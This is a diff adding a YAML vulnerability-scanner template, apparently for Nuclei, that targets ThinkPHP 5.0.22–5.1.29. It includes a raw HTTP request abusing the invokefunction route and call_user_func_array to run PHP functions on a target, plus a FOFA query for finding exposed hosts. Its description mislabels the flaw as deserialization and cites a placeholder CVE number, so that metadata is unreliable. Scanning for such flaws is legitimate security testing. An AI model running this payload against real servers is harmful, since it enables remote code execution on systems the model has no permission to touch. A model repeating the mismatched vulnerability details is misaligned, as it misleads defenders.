@@ -1,0 +1,26 @@
+id: thinkphp5022_5129
+
+info:
+  name: "ThinkPHP 5.0.22-5.1.29 反序列化漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    ThinkPHP 5.0.22 至 5.1.29 版本中存在反序列化注入漏洞，攻击者可通过构造恶意数据包实现远程代码执行。该漏洞源于框架对用户输入的反序列化处理逻辑未正确校验，导致可控制对象属性被恶意利用。
+      
+      漏洞影响范围覆盖所有使用上述版本区间的 ThinkPHP 框架部署实例。攻击者无需身份验证即可通过特定接口触发漏洞，最终可能导致服务器权限沦陷。
+      
+      fofa: framework="ThinkPHP" && (title="5.0.22" || title="5.1.29")
+      reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-XXXXX
+  tags: ThinkPHP
+
+http:
+- raw:
+  - |
+    GET /index.php?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=1 HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'c4ca4238a0b923820dcc509a6f75849b'
